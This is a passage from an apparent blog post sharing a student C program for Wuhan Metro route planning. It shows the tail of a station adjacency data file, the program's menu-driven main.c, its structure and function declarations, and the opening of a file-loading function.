16 2 4 0 1.35 4 15 4 0 1.35 4 17</span><br><span class="line">复兴路站 4 17 2 4 0 1.35 4 16 4 0 1.35 4 18</span><br><span class="line">拦江路站 4 18 2 4 0 1.35 4 17 4 0 1.35 4 19</span><br><span class="line">钟家村站 4 19 4 4 0 1.35 4 18 4 0 1.35 4 20 6 1 1.34 6 22 6 1 1.34 6 24</span><br><span class="line">汉阳火车站站 4 20 2 4 0 1.35 4 19 4 0 1.35 4 21</span><br><span class="line">五里墩站 4 21 2 4 0 1.35 4 20 4 0 1.35 4 22</span><br><span class="line">七里庙站 4 22 2 4 0 1.35 4 21 4 0 1.35 4 23</span><br><span class="line">十里铺站 4 23 2 4 0 1.35 4 22 4 0 1.35 4 24</span><br><span class="line">王家湾站 4 24 4 4 0 1.35 4 23 4 0 1.35 4 25 3 1 1.30 3 15 3 1 1.30 3 17</span><br><span class="line">玉龙路站 4 25 2 4 0 1.35 4 24 4 0 1.35 4 26</span><br><span class="line">永安堂站 4 26 2 4 0 1.35 4 25 4 0 1.35 4 27</span><br><span class="line">孟家铺站 4 27 2 4 0 1.35 4 26 4 0 1.35 4 28</span><br><span class="line">黄金口站 4 28 2 4 0 1.35 4 27 4 0 1.35 4 29</span><br><span class="line">新天站 4 29 2 4 0 1.35 4 28 4 0 1.35 4 30</span><br><span class="line">集贤站 4 30 2 4 0 1.35 4 29 4 0 1.35 4 31</span><br><span class="line">知音站 4 31 2 4 0 1.35 4 30 4 0 1.35 4 32</span><br><span class="line">新农站 4 32 2 4 0 1.35 4 31 4 0 1.35 4 33</span><br><span class="line">凤凰路站 4 33 2 4 0 1.35 4 32 4 0 1.35 4 34</span><br><span class="line">蔡甸广场站 4 34 2 4 0 1.35 4 33 4 0 1.35 4 35</span><br><span class="line">临漳大道站 4 35 2 4 0 1.35 4 34 4 0 1.35 4 36</span><br><span class="line">新庙村站 4 36 2 4 0 1.35 4 35 4 0 1.35 4 37</span><br><span class="line">柏林站 4 37 1 4 0 1.35 4 36</span><br><span class="line">富民南路站 6 1 1 6 0 1.34 6 2</span><br><span class="line">码头潭公园站 6 2 4 6 0 1.34 6 1 6 0 1.34 6 3 1 1 1.24 1 2 1 1 1.24 1 4</span><br><span class="line">临空港大道站 6 3 2 6 0 1.34 6 2 6 0 1.34 6 4</span><br><span class="line">二雅路站 6 4 2 6 0 1.34 6 3 6 0 1.34 6 5</span><br><span class="line">金银湖停车场站 6 5 2 6 0 1.34 6 4 6 0 1.34 6 6</span><br><span class="line">金银湖公园站 6 6 2 6 0 1.34 6 5 6 0 1.34 6 7</span><br><span class="line">金银湖站 6 7 2 6 0 1.34 6 6 6 0 1.34 6 8</span><br><span class="line">园博园北站 6 8 4 6 0 1.34 6 7 6 0 1.34 6 9 7 1 2.33 7 11 7 1 2.33 7 13</span><br><span class="line">轻工大学站 6 9 2 6 0 1.34 6 8 6 0 1.34 6 10</span><br><span class="line">常青花园站 6 10 4 6 0 1.34 6 9 6 0 1.34 6 11 2 1 1.64 2 8 2 1 1.64 2 10</span><br><span class="line">杨汊湖站 6 11 2 6 0 1.34 6 10 6 0 1.34 6 12</span><br><span class="line">石桥站 6 12 2 6 0 1.34 6 11 6 0 1.34 6 13</span><br><span class="line">唐家墩站 6 13 2 6 0 1.34 6 12 6 0 1.34 6 14</span><br><span class="line">三眼桥站 6 14 2 6 0 1.34 6 13 6 0 1.34 6 15</span><br><span class="line">香港路站 6 15 6 6 0 1.34 6 14 6 0 1.34 6 16 3 1 1.30 3 8 3 1 1.30 3 10 7 1 2.33 7 17 7 1 2.33 7 19</span><br><span class="line">苗栗路站 6 16 2 6 0 1.34 6 15 6 0 1.34 6 17</span><br><span class="line">大智路站 6 17 4 6 0 1.34 6 16 6 0 1.34 6 18 1 1 1.24 1 20 1 1 1.24 1 22</span><br><span class="line">江汉路站 6 18 4 6 0 1.34 6 17 6 0 1.34 6 19 2 1 1.64 2 16 2 1 1.64 2 18</span><br><span class="line">六渡桥站 6 19 2 6 0 1.34 6 18 6 0 1.34 6 20</span><br><span class="line">汉正街站 6 20 2 6 0 1.34 6 19 6 0 1.34 6 21</span><br><span class="line">武胜路站 6 21 2 6 0 1.34 6 20 6 0 1.34 6 22</span><br><span class="line">琴台站 6 22 2 6 0 1.34 6 21 6 0 1.34 6 23</span><br><span class="line">钟家村站 6 23 4 6 0 1.34 6 22 6 0 1.34 6 24 4 1 1.35 4 18 4 1 1.35 4 20</span><br><span class="line">马鹦路站 6 24 2 6 0 1.34 6 23 6 0 1.34 6 25</span><br><span class="line">建港站 6 25 2 6 0 1.34 6 24 6 0 1.34 6 26</span><br><span class="line">前进村站 6 26 2 6 0 1.34 6 25 6 0 1.34 6 27</span><br><span class="line">国博中心北站 6 27 2 6 0 1.34 6 26 6 0 1.34 6 28</span><br><span class="line">国博中心南站 6 28 2 6 0 1.34 6 27 6 0 1.34 6 29</span><br><span class="line">老关村站 6 29 2 6 0 1.34 6 28 6 0 1.34 6 30</span><br><span class="line">江城大道站 6 30 2 6 0 1.34 6 29 6 0 1.34 6 31</span><br><span class="line">车城东路站 6 31 2 6 0 1.34 6 30 6 0 1.34 6 32</span><br><span class="line">东风公司站 6 32 3 6 0 1.34 6 31 3 1 1.30 3 22 3 1 1.30 3 24</span><br><span class="line">黄陂广场站 7 1 1 7 0 2.33 7 2</span><br><span class="line">百泰路站 7 2 2 7 0 2.33 7 1 7 0 2.33 7 3</span><br><span class="line">北车基地站 7 3 2 7 0 2.33 7 2 7 0 2.33 7 4</span><br><span class="line">余彭塆站 7 4 2 7 0 2.33 7 3 7 0 2.33 7 5</span><br><span class="line">横店站 7 5 2 7 0 2.33 7 4 7 0 2.33 7 6</span><br><span class="line">临空北路站 7 6 2 7 0 2.33 7 5 7 0 2.33 7 7</span><br><span class="line">天阳路站 7 7 2 7 0 2.33 7 6 7 0 2.33 7 8</span><br><span class="line">腾龙大道站 7 8 2 7 0 2.33 7 7 7 0 2.33 7 9</span><br><span class="line">巨龙大道站 7 9 4 7 0 2.33 7 8 7 0 2.33 7 10 2 1 1.64 2 3 2 1 1.64 2 5</span><br><span class="line">汤云海站 7 10 2 7 0 2.33 7 9 7 0 2.33 7 11</span><br><span class="line">马池站 7 11 2 7 0 2.33 7 10 7 0 2.33 7 12</span><br><span class="line">园博园北站 7 12 4 7 0 2.33 7 11 7 0 2.33 7 13 6 1 1.34 6 7 6 1 1.34 6 9</span><br><span class="line">园博园站 7 13 2 7 0 2.33 7 12 7 0 2.33 7 14</span><br><span class="line">常码头站 7 14 2 7 0 2.33 7 13 7 0 2.33 7 15</span><br><span class="line">武汉商务区站 7 15 4 7 0 2.33 7 14 7 0 2.33 7 16 3 1 1.30 3 12 3 1 1.30 3 14</span><br><span class="line">王家墩东站 7 16 4 7 0 2.33 7 15 7 0 2.33 7 17 2 1 1.64 2 12 2 1 1.64 2 14</span><br><span class="line">取水楼站 7 17 2 7 0 2.33 7 16 7 0 2.33 7 18</span><br><span class="line">香港路站 7 18 6 7 0 2.33 7 17 7 0 2.33 7 19 3 1 1.30 3 8 3 1 1.30 3 10 6 1 1.34 6 14 6 1 1.30 6 16</span><br><span class="line">三阳路站 7 19 4 7 0 2.33 7 18 7 0 2.33 7 20 1 1 1.24 1 21 1 1 1.24 1 23</span><br><span class="line">徐家棚站 7 20 4 7 0 2.33 7 19 7 0 2.33 7 21 8 1 1.36 8 7 8 1 1.36 8 9</span><br><span class="line">湖北大学站 7 21 2 7 0 2.33 7 20 7 0 2.33 7 22</span><br><span class="line">新河街站 7 22 2 7 0 2.33 7 21 7 0 2.33 7 23</span><br><span class="line">螃蟹岬站 7 23 4 7 0 2.33 7 22 7 0 2.33 7 24 2 1 1.64 2 18 2 1 1.64 2 20</span><br><span class="line">小东门站 7 24 2 7 0 2.33 7 23 7 0 2.33 7 25</span><br><span class="line">武昌火车站站 7 25 4 7 0 2.33 7 24 7 0 2.33 7 26 4 1 1.35 4 14 4 1 1.35 4 16</span><br><span class="line">瑞安街站 7 26 2 7 0 2.33 7 25 7 0 2.33 7 27</span><br><span class="line">建安街站 7 27 2 7 0 2.33 7 26 7 0 2.33 7 28</span><br><span class="line">湖工大站 7 28 2 7 0 2.33 7 27 7 0 2.33 7 29</span><br><span class="line">板桥站 7 29 2 7 0 2.33 7 28 7 0 2.33 7 30</span><br><span class="line">野芷湖站 7 30 4 7 0 2.33 7 29 7 0 2.33 7 31 8 1 1.36 8 23 8 1 1.36 8 25</span><br><span class="line">新路村站 7 31 2 7 0 2.33 7 30 7 0 2.33 7 32</span><br><span class="line">大花岭站 7 32 2 7 0 2.33 7 31 7 0 2.33 7 33</span><br><span class="line">江夏客厅站 7 33 2 7 0 2.33 7 32 7 0 2.33 7 34</span><br><span class="line">谭鑫培公园站 7 34 2 7 0 2.33 7 33 7 0 2.33 7 35</span><br><span class="line">北华街站 7 35 2 7 0 2.33 7 34 7 0 2.33 7 36</span><br><span class="line">纸坊大街站 7 36 2 7 0 2.33 7 35 7 0 2.33 7 37</span><br><span class="line">青龙山地铁小镇站 7 37 1 7 0 2.33 7 36</span><br><span class="line">金潭路站 8 1 1 8 0 1.36 8 2</span><br><span class="line">宏图大道站 8 2 5 8 0 1.36 8 1 8 0 1.36 8 3 2 1 1.64 2 5 2 1 1.64 2 7 3 1 1.30 3 2</span><br><span class="line">塔子湖站 8 3 2 8 0 1.36 8 2 8 0 1.36 8 4</span><br><span class="line">中一路站 8 4 2 8 0 1.36 8 3 8 0 1.36 8 5</span><br><span class="line">竹叶山站 8 5 2 8 0 1.36 8 4 8 0 1.36 8 6</span><br><span class="line">赵家条站 8 6 4 8 0 1.36 8 5 8 0 1.36 8 7 3 1 1.30 3 6 3 1 1.30 3 8</span><br><span class="line">黄浦路站 8 7 4 8 0 1.36 8 6 8 0 1.36 8 8 1 1 1.24 1 22 1 1 1.24 1 24</span><br><span class="line">徐家棚站 8 8 4 8 0 1.36 8 7 8 0 1.36 8 9 7 1 2.33 7 19 7 1 2.33 7 21</span><br><span class="line">徐东站 8 9 2 8 0 1.36 8 8 8 0 1.36 8 10</span><br><span class="line">汪家墩站 8 10 2 8 0 1.36 8 9 8 0 1.36 8 11</span><br><span class="line">岳家嘴站 8 11 4 8 0 1.36 8 10 8 0 1.36 8 12 4 1 1.35 4 7 4 1 1.35 4 9</span><br><span class="line">梨园站 8 12 2 8 0 1.36 8 11 8 0 1.36 8 13</span><br><span class="line">省博湖北日报站 8 13 2 8 0 1.36 8 12 8 0 1.36 8 14</span><br><span class="line">中南医院站 8 14 2 8 0 1.36 8 13 8 0 1.36 8 15</span><br><span class="line">水果湖站 8 15 2 8 0 1.36 8 14 8 0 1.36 8 16</span><br><span class="line">洪山路站 8 16 2 8 0 1.36 8 15 8 0 1.36 8 17</span><br><span class="line">小洪山站 8 17 2 8 0 1.36 8 16 8 0 1.36 8 18</span><br><span class="line">街道口站 8 18 4 8 0 1.36 8 17 8 0 1.36 8 19 2 1 1.64 2 23 2 1 1.64 2 25</span><br><span class="line">马房山站 8 19 2 8 0 1.36 8 18 8 0 1.36 8 20</span><br><span class="line">文治街站 8 20 2 8 0 1.36 8 19 8 0 1.36 8 21</span><br><span class="line">文昌路站 8 21 2 8 0 1.36 8 20 8 0 1.36 8 22</span><br><span class="line">省农科院站 8 22 2 8 0 1.36 8 21 8 0 1.36 8 23</span><br><span class="line">马湖站 8 23 2 8 0 1.36 8 22 8 0 1.36 8 24</span><br><span class="line">野芷湖站 8 24 2 8 0 1.36 8 23 8 0 1.36 8 25</span><br><span class="line">黄家湖地铁小镇站 8 25 2 8 0 1.36 8 24 8 0 1.36 8 26</span><br><span class="line">军运村站 8 26 1 8 0 1.36 8 25</span><br></pre></td></tr></table></figure>
<h3 id="mainc"><a class="markdownIt-Anchor" href="#mainc"></a> main.c</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Functions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DealPath.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> op = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> g1, g2;</span><br><span class="line">    <span class="keyword">while</span> (op) &#123;</span><br><span class="line">        system(<span class="string">&quot;cls&quot;</span>);	<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;              Menu for Linear Table On Wuhan Metro \n&quot;</span></span><br><span class="line">            <span class="string">&quot;------------------------------------------------------------------------\n&quot;</span></span><br><span class="line">            <span class="string">&quot;注：初始约定为最早一班车6:00（发车），最晚一班车23:00（发车）\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    约定发车间隔时间为4分钟，可在IntiaLine中修改变量time_interval修改\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    简化约定车辆在相邻站点行驶时间为2分钟，停留时间为1分钟\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    边的距离为线路总距离平分到各条边\n&quot;</span></span><br><span class="line">            <span class="string">&quot;------------------------------------------------------------------------\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    	           1. 初始化站点图       2.遍历线路\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    	           3.设置当前时间        4.查询路径\n&quot;</span></span><br><span class="line">            <span class="string">&quot;                  5.修改线路拥挤度      6.开启无痕操作\n&quot;</span></span><br><span class="line">            <span class="string">&quot;                  7.查询站点时刻表      0.退出程序\n&quot;</span></span><br><span class="line">            <span class="string">&quot;------------------------------------------------------------------------\n&quot;</span></span><br><span class="line">            <span class="string">&quot;    请选择你的操作[0~7]:&quot;</span>);<span class="comment">//操作菜单*/</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;op);</span><br><span class="line">        Log(privacy, op);</span><br><span class="line">        <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            IntiaStation();</span><br><span class="line">            IntiaLine();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;初始化成功！\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            TraverseLine();</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            SetCurrentTime();</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            QueryPath();</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            SetDefaultCrowd();</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            privacy = <span class="number">0</span>;</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入当前站点（形如3 21）：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;g1, &amp;g2);</span><br><span class="line">            Log(privacy, g1);</span><br><span class="line">            Log(privacy, g2);</span><br><span class="line">            QuerySubwayTime(g1,g2);</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="comment">//end of switch</span></span><br><span class="line">    &#125;<span class="comment">//end of while</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="structsh"><a class="markdownIt-Anchor" href="#structsh"></a> Structs.h</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STRUCTS_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCTS_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//结构部分</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">double</span> distance;<span class="comment">//边的距离</span></span><br><span class="line">	<span class="keyword">int</span> line;<span class="comment">//所在线路</span></span><br><span class="line">	<span class="keyword">int</span> IsTransfer;<span class="comment">//该邻接边相对于表头站点是否在一条线路，在则为0，否则为1</span></span><br><span class="line">	<span class="keyword">int</span> nextline;<span class="comment">//记录邻接站点所在线路</span></span><br><span class="line">	<span class="keyword">int</span> nextnumber;<span class="comment">//记录邻接站点在所在线路序号</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span>* <span class="title">next</span>;</span><span class="comment">//指向下一条邻接边，最后一条指向NULL</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Station</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> line;<span class="comment">//站点所在路线</span></span><br><span class="line">	<span class="keyword">int</span> number;<span class="comment">//站点在该线路中的序号</span></span><br><span class="line">	<span class="keyword">int</span> Linjienum;<span class="comment">//该站点邻接边的数量</span></span><br><span class="line">	<span class="keyword">int</span> IsPassed;<span class="comment">//查询路径时该站点是否遍历过的标记</span></span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];<span class="comment">//该站点的名字</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span>* <span class="title">next</span>;</span><span class="comment">//指向该站点的首条邻接边</span></span><br><span class="line">&#125;Station;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Path</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	Station s[<span class="number">226</span>];<span class="comment">//存储走过的站点</span></span><br><span class="line">	<span class="keyword">int</span> HuanNum;<span class="comment">//换乘次数</span></span><br><span class="line">	<span class="keyword">int</span> Num;<span class="comment">//经过站点数量</span></span><br><span class="line">	<span class="keyword">int</span>	NotGet;<span class="comment">//能否到达,=0表示能抵达</span></span><br><span class="line">	<span class="keyword">double</span> crowding;<span class="comment">//路线拥挤程度</span></span><br><span class="line">	<span class="keyword">double</span> distance;<span class="comment">//路线总距离</span></span><br><span class="line">	<span class="keyword">double</span> minute;<span class="comment">//乘车花费时间，用分钟来计算</span></span><br><span class="line">	<span class="keyword">double</span> Factorminute;<span class="comment">//考虑拥挤程度的时间</span></span><br><span class="line">	<span class="keyword">double</span> fare;<span class="comment">//该条路径花费的money</span></span><br><span class="line">&#125;Path;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Line</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">double</span> crowding;<span class="comment">//线路当前时间拥挤度</span></span><br><span class="line">	<span class="keyword">double</span> crow[<span class="number">3</span>];<span class="comment">//拥挤度数组，用于存放不同时间的拥挤度</span></span><br><span class="line">	<span class="keyword">int</span> time_interval;<span class="comment">//间隔发车时间</span></span><br><span class="line">	<span class="keyword">int</span> start_number;<span class="comment">//线路起点序号</span></span><br><span class="line">	<span class="keyword">int</span> end_number;<span class="comment">//线路终点序号</span></span><br><span class="line">&#125;Line;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局变量</span></span><br><span class="line"><span class="keyword">int</span> print[<span class="number">10</span>];<span class="comment">//存放待打印的路径下标</span></span><br><span class="line"><span class="keyword">int</span> CurrentTime;<span class="comment">//现在的时刻,由用户输入</span></span><br><span class="line"><span class="keyword">int</span> pathnumber = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Station</span> <span class="title">s</span>[226];</span></span><br><span class="line">Path path[<span class="number">11</span>];<span class="comment">//path[0]用来临时存储，path[1]-path[10]存储10条路径</span></span><br><span class="line">Line line[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int</span> privacy = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//提供所有函数的声明部分</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IntiaStation</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">Station <span class="title">FindStation</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FindNumber</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseLine</span><span class="params">()</span></span>;<span class="comment">//遍历线路</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseByLine</span><span class="params">(<span class="keyword">int</span> number)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TraverseByStation</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">CheckFare</span><span class="params">(<span class="keyword">double</span> distance)</span></span>;<span class="comment">//计算票价</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> l1, <span class="keyword">int</span> n1, <span class="keyword">int</span> l2, <span class="keyword">int</span> n2)</span></span>;<span class="comment">//查找路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IntiaPath</span><span class="params">(<span class="keyword">int</span> m)</span></span>;<span class="comment">//初始化或重置路径数据</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CheckPath</span><span class="params">()</span></span>;<span class="comment">//从3条路径中去除最长的路径,并将下标返回</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CountPathNum</span><span class="params">(<span class="keyword">int</span> m)</span></span>;<span class="comment">//计算当前路径的站点个数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CopyPath</span><span class="params">(<span class="keyword">int</span> m1, <span class="keyword">int</span> m2)</span></span>;<span class="comment">//将m1路径复制到m2路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintPath</span><span class="params">(<span class="keyword">int</span> flag)</span></span>;<span class="comment">//打印路径数据,flag=0表示不考虑拥挤程度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HandlePath</span><span class="params">()</span></span>;<span class="comment">//处理路径的数据</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MaxNum</span><span class="params">(<span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IntiaLine</span><span class="params">()</span></span>;<span class="comment">//初始化线路</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCrowding</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">double</span> time)</span></span>;<span class="comment">//根据当前时间修改路线的拥挤度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetDefaultCrowd</span><span class="params">()</span></span>;<span class="comment">//修改上下班等拥挤度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuerySubwayTime</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n)</span></span>;<span class="comment">//对当前站点查询最近的列车时间</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">QueryPathTime</span><span class="params">(<span class="keyword">int</span> path_number, <span class="keyword">double</span> time,<span class="keyword">int</span> flag)</span></span>;<span class="comment">//计算当前路径消耗时间,flag=0不考虑拥挤度</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">TimeFactor</span><span class="params">(<span class="keyword">double</span> crowding)</span></span>;<span class="comment">//由拥挤程度计算出时间系数并返回</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetStationTime</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> n, <span class="keyword">int</span> direction, <span class="keyword">double</span> time)</span></span>;<span class="comment">//返回时间上最近的一班车，direction=0代表往终点方向</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SortPath</span><span class="params">(<span class="keyword">int</span> choice)</span></span>;<span class="comment">//对存放的6条路径排序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCurrentTime</span><span class="params">()</span></span>;<span class="comment">//设置当前时间</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QueryPath</span><span class="params">()</span></span>;<span class="comment">//处理路径的总函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Log</span><span class="params">(<span class="keyword">int</span> privacy,<span class="keyword">double</span> x)</span></span>;<span class="comment">//记录日志，privacy=0表示不记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCrowdRange</span><span class="params">()</span></span>;<span class="comment">//输入拥挤度进行筛选</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cry</span><span class="params">()</span></span>;<span class="comment">//文件加密工作</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnCry</span><span class="params">()</span></span>;<span class="comment">//文件解密操作</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Verification</span><span class="params">()</span></span>;<span class="comment">//校验密码是否正确,正确则返回1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// !STRUCTS_H</span></span></span><br></pre></td></tr></table></figure>
<h3 id="functionsh"><a class="markdownIt-Anchor" href="#functionsh"></a> Functions.h</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FUNCTION_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUNCTION_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Structs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> (disable:4996)</span></span><br><span class="line"><span class="comment">//函数定义实现部分</span></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：IntiaStation</span></span><br><span class="line"><span class="comment">*函数功能：初始化站点，并构建其邻接表</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IntiaStation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span>* filename = <span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\Station.txt&quot;</span>;</span><br><span class="line">	FILE* fp = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	EdgeNode* p, * q;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">226</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i].next = (struct EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct EdgeNode));</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">4</span> == <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s%d%d%d&quot;</span>, &amp;(s[i].name), &amp;(s[i].line), &amp;(s[i].number), &amp;(s[i].Linjienum)))</span><br><span class="line">		&#123;</span><br><span class="line">			p = s[i].next;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">5</span> == <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d%d%lf%d%d&quot;</span>, &amp;(p-&gt;line), &amp;(p-&gt;IsTransfer), &amp;(p-&gt;distance), &amp;(p-&gt;nextline), &amp;(p-&gt;nextnumber)))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; 